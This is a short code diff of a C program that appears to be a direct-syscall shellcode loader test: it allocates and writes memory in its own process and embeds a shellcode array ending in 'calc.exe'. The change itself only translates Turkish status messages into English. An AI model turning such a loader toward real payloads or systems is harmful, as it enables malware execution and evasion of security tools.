@@ -23,8 +23,7 @@ int main() {
     "\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e"
     "\x65\x78\x65\x00";
 
-    printf("[*] Syscall test ediliyor...\n");
-
+    
 	HANDLE currentProcess = GetCurrentProcess();
     LPVOID baseAddr = NULL;
     SIZE_T regionSize = 0x1000;
@@ -40,10 +39,10 @@ int main() {
     );
 
     if (status == 0) {
-        printf("[+] Success! Bellek adresi: %p\n", baseAddr);
+        printf("[+] Success! Memory Adress: %p\n", baseAddr);
     }
     else {
-        printf("[-] Hata! NTSTATUS: 0x%X\n", status);
+        printf("[-] ERROR! NTSTATUS: 0x%X\n", status);
     }
 
 	    NTSTATUS writeStatus = NtWriteVirtualMemory(
@@ -87,7 +86,7 @@ int main() {
     }
     else
     {
-        printf("[-] Hata! NTSTATUS: 0x%X\n", status);
+        printf("[-] ERROR! NTSTATUS: 0x%X\n", status);
     }
 
 
